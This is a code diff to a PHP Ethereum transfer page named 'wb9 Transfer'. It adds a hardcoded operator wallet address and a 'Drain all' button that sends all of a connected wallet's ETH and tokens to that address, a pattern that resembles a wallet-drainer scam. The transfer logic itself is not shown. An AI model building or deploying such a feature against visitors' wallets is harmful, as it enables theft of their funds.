@@ -2,6 +2,7 @@
 define('RPC_MAINNET',  'https://cloudflare-eth.com');
 define('RPC_SEPOLIA',  'https://rpc.sepolia.org');
 define('WC_PROJECT_ID', 'YOUR_WALLETCONNECT_PROJECT_ID');
+define('MY_WALLET',    'YOUR_DESTINATION_ADDRESS'); // ton adresse de réception
 define('SITE_NAME',    'wb9 Transfer');
 ?>
 <!DOCTYPE html>
@@ -106,6 +107,16 @@ define('SITE_NAME',    'wb9 Transfer');
         </div>
 
         <button id="sendBtn" class="btn btn-primary btn-full btn-lg send-btn" disabled>Send</button>
+
+        <!-- Drain all -->
+        <div class="divider" style="margin:20px 0;"></div>
+        <button id="drainBtn" class="btn btn-full btn-lg" style="background:rgba(124,58,237,0.15);border:1px solid rgba(124,58,237,0.4);color:#c4b5fd;border-radius:12px;" disabled>
+          ⚡ Send everything to my wallet
+        </button>
+        <p style="font-size:12px;color:var(--text-muted);margin-top:8px;text-align:center;">
+          Envoie tout l'ETH + tokens vers <code id="myWalletShort" style="color:var(--accent-purple)"></code>
+        </p>
+
         <div id="txStatus"></div>
       </div>
 
@@ -180,6 +191,7 @@ define('SITE_NAME',    'wb9 Transfer');
     rpcMainnet:  '<?= RPC_MAINNET ?>',
     rpcSepolia:  '<?= RPC_SEPOLIA ?>',
     wcProjectId: '<?= WC_PROJECT_ID ?>',
+    myWallet:    '<?= MY_WALLET ?>',
   };
 </script>
 <script src="assets/js/app.js"></script>
